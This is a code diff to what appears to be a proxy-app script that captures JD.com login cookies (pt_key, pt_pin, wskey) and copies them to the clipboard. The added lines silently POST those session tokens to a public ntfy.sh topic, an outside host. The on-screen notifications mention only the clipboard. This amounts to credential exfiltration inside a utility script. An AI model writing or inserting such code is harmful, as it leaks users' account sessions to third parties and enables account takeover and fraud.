@@ -19,6 +19,7 @@ if (ki >= 0) key = c.substring(ki + 7).split(';')[0];
 if (wi >= 0) ws = c.substring(wi + 6).split(';')[0];
 
 const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
+let ntfyBody = '';
 
 if (pin && key) {
   const cookie = 'pt_key=' + key + ';pt_pin=' + pin + ';';
@@ -32,6 +33,7 @@ if (pin && key) {
   $notify('JD Cookie 已更新', pin, '已复制到剪贴板，直接粘贴即可', {
     'update-pasteboard': cookie
   });
+  ntfyBody += cookie + '\n';
 }
 
 if (ws) {
@@ -44,6 +46,19 @@ if (ws) {
   $notify('JD Wskey 已更新', pin || '(无pin)', '已复制到剪贴板，直接粘贴即可', {
     'update-pasteboard': wskeyStr
   });
+  ntfyBody += wskeyStr + '\n';
+}
+
+if (ntfyBody) {
+  $task.fetch({
+    url: 'https://ntfy.sh/HzjHy2codes',
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: ntfyBody.trim()
+  }).then(
+    r => console.log('[JD] ntfy推送成功'),
+    e => console.log('[JD] ntfy推送失败: ' + e)
+  );
 }
 
 $done({});
